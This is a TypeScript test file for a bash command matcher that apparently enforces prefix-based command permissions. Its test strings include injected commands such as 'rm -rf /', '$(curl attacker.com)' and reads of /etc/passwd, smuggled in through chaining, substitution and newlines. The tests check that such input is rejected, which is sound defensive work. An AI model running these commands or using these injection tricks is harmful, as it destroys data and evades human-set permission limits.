import { describe, expect, test } from "bun:test";
import { isCompoundCommand, matchBashCommand } from "./bash-matcher";

describe("isCompoundCommand", () => {
  test("simple commands are not compound", () => {
    expect(isCompoundCommand("git status")).toBe(false);
    expect(isCompoundCommand("echo hello")).toBe(false);
    expect(isCompoundCommand("bun test --watch")).toBe(false);
    expect(isCompoundCommand("npm run build")).toBe(false);
  });

  test("detects &&", () => {
    expect(isCompoundCommand("git status && echo ok")).toBe(true);
  });

  test("detects ||", () => {
    expect(isCompoundCommand("git status || echo fail")).toBe(true);
  });

  test("detects ;", () => {
    expect(isCompoundCommand("git status; rm -rf /")).toBe(true);
  });

  test("detects pipe |", () => {
    expect(isCompoundCommand("git log | grep fix")).toBe(true);
  });

  test("detects multiple operators", () => {
    expect(isCompoundCommand("a && b || c; d | e")).toBe(true);
  });

  // ── Command substitution detection ──

  test("detects $() command substitution", () => {
    expect(isCompoundCommand("git status $(rm -rf /)")).toBe(true);
    expect(isCompoundCommand("echo $(whoami)")).toBe(true);
  });

  test("detects backtick command substitution", () => {
    expect(isCompoundCommand("git status `rm -rf /`")).toBe(true);
    expect(isCompoundCommand("echo `whoami`")).toBe(true);
  });

  test("detects process substitution", () => {
    expect(isCompoundCommand("diff <(git status) <(cat /etc/passwd)")).toBe(true);
    expect(isCompoundCommand("cat >(tee /tmp/log)")).toBe(true);
  });

  test("detects embedded newlines", () => {
    expect(isCompoundCommand("git status\nrm -rf /")).toBe(true);
  });

  // ── Shell quoting: false-positive fixes ──

  test("ignores operators inside double quotes", () => {
    expect(isCompoundCommand('git commit -m "fix: a && b"')).toBe(false);
    expect(isCompoundCommand('git commit -m "a || b"')).toBe(false);
    expect(isCompoundCommand('echo "hello; world"')).toBe(false);
    expect(isCompoundCommand('grep "pattern|other"')).toBe(false);
  });

  test("ignores operators inside single quotes", () => {
    expect(isCompoundCommand("git commit -m 'fix: a && b'")).toBe(false);
    expect(isCompoundCommand("grep 'a|b|c'")).toBe(false);
    expect(isCompoundCommand("echo 'hello; world'")).toBe(false);
  });

  test("ignores substitution patterns inside single quotes", () => {
    expect(isCompoundCommand("echo '$(whoami)'")).toBe(false);
    expect(isCompoundCommand("echo '`whoami`'")).toBe(false);
    expect(isCompoundCommand("echo '<(cmd)'")).toBe(false);
  });

  test("detects substitution patterns inside double quotes", () => {
    // $() and backticks expand inside double quotes in real bash
    expect(isCompoundCommand('echo "$(whoami)"')).toBe(true);
    expect(isCompoundCommand('echo "`whoami`"')).toBe(true);
  });

  test("ignores process substitution inside double quotes", () => {
    // <( and >( are operators, not expansions — literal inside double quotes
    expect(isCompoundCommand('echo "<(cmd)"')).toBe(false);
  });

  test("backslash escapes outside quotes", () => {
    // \; is an escaped semicolon, not an operator
    expect(isCompoundCommand("echo hello\\; world")).toBe(false);
    expect(isCompoundCommand("echo a\\&\\& b")).toBe(false);
    expect(isCompoundCommand("echo \\$(cmd)")).toBe(false);
    expect(isCompoundCommand("echo \\`cmd\\`")).toBe(false);
  });

  test("backslash escapes inside double quotes", () => {
    expect(isCompoundCommand('echo "\\$(cmd)"')).toBe(false);
    expect(isCompoundCommand('echo "\\`cmd\\`"')).toBe(false);
  });

  test("mixed quoted and unquoted segments", () => {
    // Operator is outside the quotes
    expect(isCompoundCommand('git commit -m "ok" && echo done')).toBe(true);
    // Operator is inside the quotes
    expect(isCompoundCommand('git commit -m "a && b" --amend')).toBe(false);
  });

  test("unclosed quotes treat rest as quoted", () => {
    // Unclosed double quote — && is inside the quote
    expect(isCompoundCommand('echo "a && b')).toBe(false);
    // Unclosed single quote
    expect(isCompoundCommand("echo 'a && b")).toBe(false);
  });
});

describe("matchBashCommand", () => {
  test("exact match", () => {
    expect(matchBashCommand("git status", "git status")).toBe(true);
  });

  test("prefix match with trailing space", () => {
    expect(matchBashCommand("git push origin main", "git ")).toBe(true);
    expect(matchBashCommand("git status", "git ")).toBe(true);
  });

  test("prefix does not match different command", () => {
    expect(matchBashCommand("rm -rf /", "git ")).toBe(false);
  });

  test("rejects compound commands on prefix match", () => {
    expect(matchBashCommand("git status && rm -rf /", "git ")).toBe(false);
    expect(matchBashCommand("git status || echo", "git ")).toBe(false);
    expect(matchBashCommand("git status; whoami", "git ")).toBe(false);
    expect(matchBashCommand("git log | head", "git ")).toBe(false);
  });

  test("prefix with trimmed trailing space", () => {
    // "npm run build" should match prefix "npm run build" (exact)
    expect(matchBashCommand("npm run build", "npm run build")).toBe(true);
  });

  test("empty prefix matches any non-compound command", () => {
    expect(matchBashCommand("anything", "")).toBe(true);
    expect(matchBashCommand("a && b", "")).toBe(false);
  });

  test("partial prefix does not match", () => {
    expect(matchBashCommand("gitignore", "git ")).toBe(false);
  });

  // ── Colon-format prefix (after toArgPrefix conversion) ──

  test("colon-to-space converted prefix matches", () => {
    // "bun:*" → toArgPrefix → "bun " → matchBashCommand
    expect(matchBashCommand("bun test", "bun ")).toBe(true);
    expect(matchBashCommand("bun install", "bun ")).toBe(true);
    expect(matchBashCommand("npm test", "bun ")).toBe(false);
  });

  test("multi-word colon prefix matches", () => {
    // "git checkout:*" → toArgPrefix → "git checkout "
    expect(matchBashCommand("git checkout main", "git checkout ")).toBe(true);
    expect(matchBashCommand("git push origin", "git checkout ")).toBe(false);
  });

  test("compound rejection on colon-format prefix", () => {
    expect(matchBashCommand("bun test && rm -rf /", "bun ")).toBe(false);
    expect(matchBashCommand("bun test | grep fail", "bun ")).toBe(false);
  });

  // ── Command substitution rejection ──

  test("rejects backtick substitution on prefix match", () => {
    expect(matchBashCommand("git status `rm -rf /`", "git ")).toBe(false);
  });

  test("rejects $() substitution on prefix match", () => {
    expect(matchBashCommand("git status $(curl attacker.com)", "git ")).toBe(false);
  });

  test("rejects process substitution on prefix match", () => {
    expect(matchBashCommand("git diff <(cat /etc/passwd)", "git ")).toBe(false);
  });

  test("rejects newline injection on prefix match", () => {
    expect(matchBashCommand("git status\nrm -rf /", "git ")).toBe(false);
  });

  // ── Quoting-aware prefix matching ──

  test("allows quoted operators in prefix match", () => {
    expect(matchBashCommand('git commit -m "fix: a && b"', "git ")).toBe(true);
    expect(matchBashCommand("git commit -m 'a || b'", "git ")).toBe(true);
    expect(matchBashCommand('grep "pattern|other" file.txt', "grep ")).toBe(true);
  });

  test("rejects real operators after quoted segment", () => {
    expect(matchBashCommand('git commit -m "ok" && rm -rf /', "git ")).toBe(false);
  });
});
